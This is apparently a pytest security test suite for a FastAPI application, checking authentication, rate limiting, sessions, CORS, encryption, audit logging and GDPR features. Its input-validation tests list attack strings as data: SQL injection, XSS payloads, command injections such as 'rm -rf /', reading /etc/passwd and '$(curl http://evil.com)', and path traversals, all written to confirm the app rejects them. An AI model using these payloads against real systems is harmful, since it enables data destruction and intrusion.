"""
Security-Focused Integration Tests
Tests for authentication, authorization, input validation, and security features
"""

import asyncio
import json
import hashlib
import hmac
from datetime import datetime, timedelta
from typing import Dict, Any, List
from unittest.mock import Mock, AsyncMock, patch
import pytest
import jwt
from fastapi import HTTPException
from fastapi.testclient import TestClient

from app.main import app
from app.core.config import settings
from app.middleware.rate_limiting import MultiTierRateLimiter
from app.middleware.message_size_validator import MessageSizeValidator, MessageType
from app.core.logging_config import PAMLogger


# =====================================================
# AUTHENTICATION TESTS
# =====================================================

class TestAuthentication:
    """Test authentication mechanisms"""
    
    def test_jwt_token_generation(self):
        """Test JWT token generation"""
        from app.core.auth import create_access_token
        
        user_data = {"sub": "user123", "email": "test@example.com"}
        token = create_access_token(user_data)
        
        # Decode and verify
        decoded = jwt.decode(token, settings.SECRET_KEY, algorithms=[settings.ALGORITHM])
        assert decoded["sub"] == "user123"
        assert decoded["email"] == "test@example.com"
        assert "exp" in decoded
    
    def test_jwt_token_validation(self):
        """Test JWT token validation"""
        from app.core.auth import verify_token
        
        # Valid token
        valid_token = jwt.encode(
            {
                "sub": "user123",
                "exp": datetime.utcnow() + timedelta(hours=1)
            },
            settings.SECRET_KEY,
            algorithm=settings.ALGORITHM
        )
        
        user = verify_token(valid_token)
        assert user["sub"] == "user123"
        
        # Invalid token
        invalid_token = "invalid.jwt.token"
        with pytest.raises(HTTPException):
            verify_token(invalid_token)
        
        # Expired token
        expired_token = jwt.encode(
            {
                "sub": "user123",
                "exp": datetime.utcnow() - timedelta(hours=1)
            },
            settings.SECRET_KEY,
            algorithm=settings.ALGORITHM
        )
        
        with pytest.raises(HTTPException):
            verify_token(expired_token)
    
    def test_supabase_token_validation(self):
        """Test Supabase token validation"""
        from app.core.auth import validate_supabase_token
        
        mock_supabase = Mock()
        mock_supabase.auth.get_user = Mock(return_value=Mock(user=Mock(id="user123")))
        
        with patch("app.core.auth.supabase", mock_supabase):
            user = validate_supabase_token("valid_supabase_token")
            assert user.id == "user123"
            
            # Invalid token
            mock_supabase.auth.get_user = Mock(side_effect=Exception("Invalid token"))
            with pytest.raises(HTTPException):
                validate_supabase_token("invalid_token")


# =====================================================
# INPUT VALIDATION TESTS
# =====================================================

class TestInputValidation:
    """Test input validation and sanitization"""
    
    def test_sql_injection_prevention(self):
        """Test SQL injection prevention"""
        validator = MessageSizeValidator()
        
        # Potential SQL injection attempts
        sql_injections = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM passwords --"
        ]
        
        for injection in sql_injections:
            message = {"content": injection}
            result = validator.validate_message(message, MessageType.API_JSON)
            
            # Should sanitize or reject malicious input
            if result["valid"]:
                # If valid, ensure it's been sanitized
                assert "DROP TABLE" not in str(result.get("sanitized", message))
                assert "UNION SELECT" not in str(result.get("sanitized", message))
    
    def test_xss_prevention(self):
        """Test XSS attack prevention"""
        validator = MessageSizeValidator()
        
        # XSS attempts
        xss_attempts = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'>"
        ]
        
        for xss in xss_attempts:
            message = {"content": xss}
            result = validator.validate_message(message, MessageType.WEBSOCKET_JSON)
            
            # Should sanitize HTML/JavaScript
            if result["valid"]:
                sanitized = result.get("sanitized", message)
                assert "<script>" not in str(sanitized)
                assert "javascript:" not in str(sanitized)
                assert "onerror=" not in str(sanitized)
    
    def test_command_injection_prevention(self):
        """Test command injection prevention"""
        validator = MessageSizeValidator()
        
        # Command injection attempts
        cmd_injections = [
            "test; rm -rf /",
            "| cat /etc/passwd",
            "`whoami`",
            "$(curl http://evil.com)"
        ]
        
        for cmd in cmd_injections:
            message = {"command": cmd}
            result = validator.validate_message(message, MessageType.API_JSON)
            
            # Should reject or sanitize command injections
            if result["valid"]:
                sanitized = result.get("sanitized", message)
                assert "rm -rf" not in str(sanitized)
                assert "/etc/passwd" not in str(sanitized)
                assert "`" not in str(sanitized)
                assert "$(" not in str(sanitized)
    
    def test_path_traversal_prevention(self):
        """Test path traversal attack prevention"""
        validator = MessageSizeValidator()
        
        # Path traversal attempts
        path_traversals = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "file:///etc/passwd",
            "../../config/database.yml"
        ]
        
        for path in path_traversals:
            message = {"file_path": path}
            result = validator.validate_message(message, MessageType.API_JSON)
            
            # Should reject path traversal attempts
            if result["valid"]:
                sanitized = result.get("sanitized", message)
                assert "../" not in str(sanitized)
                assert "..\\" not in str(sanitized)
                assert "file://" not in str(sanitized)


# =====================================================
# RATE LIMITING SECURITY TESTS
# =====================================================

class TestRateLimitingSecurity:
    """Test rate limiting for security"""
    
    @pytest.mark.asyncio
    async def test_brute_force_protection(self):
        """Test protection against brute force attacks"""
        rate_limiter = MultiTierRateLimiter()
        
        # Simulate brute force login attempts
        attacker_ip = "192.168.1.100"
        endpoint = "/api/v1/auth/login"
        
        # Track failed attempts
        failed_attempts = []
        
        for i in range(10):
            result = await rate_limiter.check_rate_limit(
                attacker_ip,
                endpoint,
                tier="auth"
            )
            
            if not result["allowed"]:
                failed_attempts.append(i)
        
        # Should block after threshold (e.g., 5 attempts)
        assert len(failed_attempts) > 0
        assert failed_attempts[0] >= 5  # Blocked after 5 attempts
    
    @pytest.mark.asyncio
    async def test_ddos_protection(self):
        """Test DDoS attack protection"""
        rate_limiter = MultiTierRateLimiter()
        
        # Simulate DDoS from multiple IPs
        attacker_ips = [f"192.168.1.{i}" for i in range(100, 200)]
        endpoint = "/api/v1/pam/chat"
        
        blocked_count = 0
        
        # Rapid requests from multiple IPs
        for ip in attacker_ips[:50]:  # Test first 50 IPs
            for _ in range(10):  # 10 requests per IP
                result = await rate_limiter.check_rate_limit(
                    ip,
                    endpoint,
                    tier="global"
                )
                if not result["allowed"]:
                    blocked_count += 1
        
        # Global rate limit should kick in
        assert blocked_count > 0
    
    @pytest.mark.asyncio
    async def test_api_abuse_protection(self):
        """Test API abuse protection"""
        rate_limiter = MultiTierRateLimiter()
        
        user_id = "abusive_user"
        expensive_endpoints = [
            "/api/v1/pam/generate",
            "/api/v1/voice/transcribe",
            "/api/v1/trips/optimize"
        ]
        
        blocked_endpoints = []
        
        for endpoint in expensive_endpoints:
            # Spam expensive endpoint
            for i in range(20):
                result = await rate_limiter.check_rate_limit(
                    user_id,
                    endpoint,
                    tier="user"
                )
                
                if not result["allowed"]:
                    blocked_endpoints.append(endpoint)
                    break
        
        # All expensive endpoints should be rate limited
        assert len(blocked_endpoints) == len(expensive_endpoints)


# =====================================================
# SESSION SECURITY TESTS
# =====================================================

class TestSessionSecurity:
    """Test session management security"""
    
    def test_session_token_generation(self):
        """Test secure session token generation"""
        from app.core.session import generate_session_token
        
        token1 = generate_session_token()
        token2 = generate_session_token()
        
        # Tokens should be unique
        assert token1 != token2
        
        # Tokens should be sufficiently long
        assert len(token1) >= 32
        
        # Tokens should be cryptographically random
        assert token1.isalnum() or "_" in token1 or "-" in token1
    
    def test_session_expiration(self):
        """Test session expiration"""
        from app.core.session import create_session, validate_session
        
        user_id = "user123"
        session_token = create_session(user_id, expire_minutes=1)
        
        # Valid session
        assert validate_session(session_token) == user_id
        
        # Expired session (mock time)
        with patch("app.core.session.datetime") as mock_datetime:
            mock_datetime.utcnow.return_value = datetime.utcnow() + timedelta(minutes=2)
            assert validate_session(session_token) is None
    
    def test_session_hijacking_prevention(self):
        """Test session hijacking prevention"""
        from app.core.session import create_session, validate_session_with_fingerprint
        
        user_id = "user123"
        user_agent = "Mozilla/5.0 Chrome/91.0"
        ip_address = "192.168.1.100"
        
        # Create session with fingerprint
        session_token = create_session(
            user_id,
            fingerprint={"user_agent": user_agent, "ip": ip_address}
        )
        
        # Valid fingerprint
        assert validate_session_with_fingerprint(
            session_token,
            user_agent=user_agent,
            ip=ip_address
        ) == user_id
        
        # Different fingerprint (potential hijack)
        assert validate_session_with_fingerprint(
            session_token,
            user_agent="Mozilla/5.0 Firefox/89.0",
            ip="192.168.1.200"
        ) is None


# =====================================================
# CORS SECURITY TESTS
# =====================================================

class TestCORSSecurity:
    """Test CORS security configuration"""
    
    def test_cors_allowed_origins(self):
        """Test CORS allowed origins"""
        client = TestClient(app)
        
        # Allowed origin
        response = client.options(
            "/api/v1/pam/chat",
            headers={"Origin": settings.CORS_ALLOWED_ORIGINS[0]}
        )
        assert response.headers.get("Access-Control-Allow-Origin") == settings.CORS_ALLOWED_ORIGINS[0]
        
        # Disallowed origin
        response = client.options(
            "/api/v1/pam/chat",
            headers={"Origin": "https://evil.com"}
        )
        assert response.headers.get("Access-Control-Allow-Origin") != "https://evil.com"
    
    def test_cors_credentials(self):
        """Test CORS credentials handling"""
        client = TestClient(app)
        
        response = client.options(
            "/api/v1/pam/chat",
            headers={"Origin": settings.CORS_ALLOWED_ORIGINS[0]}
        )
        
        if settings.CORS_ALLOW_CREDENTIALS:
            assert response.headers.get("Access-Control-Allow-Credentials") == "true"
        else:
            assert response.headers.get("Access-Control-Allow-Credentials") != "true"
    
    def test_cors_methods(self):
        """Test CORS allowed methods"""
        client = TestClient(app)
        
        response = client.options(
            "/api/v1/pam/chat",
            headers={"Origin": settings.CORS_ALLOWED_ORIGINS[0]}
        )
        
        allowed_methods = response.headers.get("Access-Control-Allow-Methods", "")
        for method in ["GET", "POST", "PUT", "DELETE"]:
            if method in settings.CORS_ALLOWED_METHODS:
                assert method in allowed_methods


# =====================================================
# ENCRYPTION TESTS
# =====================================================

class TestEncryption:
    """Test data encryption"""
    
    def test_password_hashing(self):
        """Test password hashing"""
        from app.core.security import hash_password, verify_password
        
        password = "SecurePassword123!"
        
        # Hash password
        hashed = hash_password(password)
        
        # Hash should be different from original
        assert hashed != password
        
        # Should be able to verify
        assert verify_password(password, hashed) == True
        
        # Wrong password should fail
        assert verify_password("WrongPassword", hashed) == False
        
        # Same password should generate different hashes (salt)
        hashed2 = hash_password(password)
        assert hashed != hashed2
    
    def test_sensitive_data_encryption(self):
        """Test encryption of sensitive data"""
        from app.core.security import encrypt_data, decrypt_data
        
        sensitive_data = {
            "api_key": "sk-1234567890",
            "ssn": "123-45-6789",
            "credit_card": "4111111111111111"
        }
        
        # Encrypt
        encrypted = encrypt_data(json.dumps(sensitive_data))
        
        # Should be encrypted
        assert "api_key" not in encrypted
        assert "123-45-6789" not in encrypted
        
        # Decrypt
        decrypted = json.loads(decrypt_data(encrypted))
        
        # Should match original
        assert decrypted == sensitive_data
    
    def test_token_signing(self):
        """Test token signing and verification"""
        from app.core.security import sign_token, verify_signed_token
        
        data = {"user_id": "user123", "role": "admin"}
        
        # Sign token
        signed_token = sign_token(data)
        
        # Verify valid token
        verified_data = verify_signed_token(signed_token)
        assert verified_data == data
        
        # Tampered token should fail
        tampered = signed_token[:-5] + "xxxxx"
        assert verify_signed_token(tampered) is None


# =====================================================
# AUDIT LOGGING TESTS
# =====================================================

class TestAuditLogging:
    """Test security audit logging"""
    
    def test_authentication_audit(self):
        """Test authentication event logging"""
        logger = PAMLogger()
        
        with patch.object(logger.audit_logger, "info") as mock_log:
            # Successful login
            logger.log_authentication(
                user_id="user123",
                event="login_success",
                ip_address="192.168.1.100",
                user_agent="Chrome/91.0"
            )
            
            mock_log.assert_called()
            log_data = mock_log.call_args[0][0]
            assert "login_success" in log_data
            assert "user123" in log_data
            assert "192.168.1.100" in log_data
    
    def test_authorization_audit(self):
        """Test authorization event logging"""
        logger = PAMLogger()
        
        with patch.object(logger.audit_logger, "warning") as mock_log:
            # Unauthorized access attempt
            logger.log_authorization_failure(
                user_id="user123",
                resource="/admin/users",
                action="DELETE",
                reason="insufficient_permissions"
            )
            
            mock_log.assert_called()
            log_data = mock_log.call_args[0][0]
            assert "authorization_failure" in log_data
            assert "/admin/users" in log_data
            assert "insufficient_permissions" in log_data
    
    def test_data_access_audit(self):
        """Test data access logging"""
        logger = PAMLogger()
        
        with patch.object(logger.audit_logger, "info") as mock_log:
            # Sensitive data access
            logger.log_data_access(
                user_id="admin123",
                data_type="user_profiles",
                action="export",
                record_count=1000
            )
            
            mock_log.assert_called()
            log_data = mock_log.call_args[0][0]
            assert "data_access" in log_data
            assert "user_profiles" in log_data
            assert "1000" in str(log_data)


# =====================================================
# VULNERABILITY TESTS
# =====================================================

class TestVulnerabilities:
    """Test for common vulnerabilities"""
    
    def test_no_sensitive_data_in_logs(self):
        """Ensure sensitive data is not logged"""
        logger = PAMLogger()
        
        sensitive_data = {
            "password": "secret123",
            "api_key": "sk-123456",
            "token": "bearer_token_here"
        }
        
        with patch.object(logger.api_logger, "info") as mock_log:
            # Log should redact sensitive fields
            logger.log_api_request(
                user_id="user123",
                endpoint="/api/login",
                method="POST",
                data=sensitive_data
            )
            
            log_data = str(mock_log.call_args[0][0])
            assert "secret123" not in log_data
            assert "sk-123456" not in log_data
            assert "bearer_token_here" not in log_data
    
    def test_no_error_details_exposed(self):
        """Ensure error details don't leak sensitive info"""
        client = TestClient(app)
        
        # Trigger an error
        response = client.post(
            "/api/v1/pam/chat",
            json={"invalid": "data"},
            headers={"Authorization": "Bearer invalid_token"}
        )
        
        # Error response should not contain:
        error_text = response.text
        assert "stack trace" not in error_text.lower()
        assert "database" not in error_text.lower()
        assert "postgresql" not in error_text.lower()
        assert settings.DATABASE_URL not in error_text
    
    def test_no_debug_endpoints_in_production(self):
        """Ensure debug endpoints are disabled in production"""
        with patch.dict(os.environ, {"NODE_ENV": "production"}):
            client = TestClient(app)
            
            debug_endpoints = [
                "/debug/routes",
                "/debug/config",
                "/debug/database",
                "/_debug"
            ]
            
            for endpoint in debug_endpoints:
                response = client.get(endpoint)
                assert response.status_code in [404, 403]  # Not found or forbidden


# =====================================================
# COMPLIANCE TESTS
# =====================================================

class TestCompliance:
    """Test compliance with security standards"""
    
    def test_gdpr_data_export(self):
        """Test GDPR data export capability"""
        from app.core.compliance import export_user_data
        
        user_id = "user123"
        
        # Export all user data
        exported_data = export_user_data(user_id)
        
        # Should include all user data categories
        assert "profile" in exported_data
        assert "preferences" in exported_data
        assert "activity_logs" in exported_data
        assert "generated_content" in exported_data
    
    def test_gdpr_data_deletion(self):
        """Test GDPR right to be forgotten"""
        from app.core.compliance import delete_user_data
        
        user_id = "user123"
        
        # Delete user data
        deletion_report = delete_user_data(user_id)
        
        # Should confirm deletion
        assert deletion_report["status"] == "completed"
        assert deletion_report["user_id"] == user_id
        assert "deleted_records" in deletion_report
    
    def test_data_retention_policy(self):
        """Test data retention policy enforcement"""
        from app.core.compliance import enforce_retention_policy
        
        # Run retention policy
        retention_report = enforce_retention_policy()
        
        # Should clean old data
        assert "logs_deleted" in retention_report
        assert "sessions_expired" in retention_report
        assert "cache_cleared" in retention_report


# =====================================================
# RUN TESTS
# =====================================================

if __name__ == "__main__":
    pytest.main([__file__, "-v", "--asyncio-mode=auto"])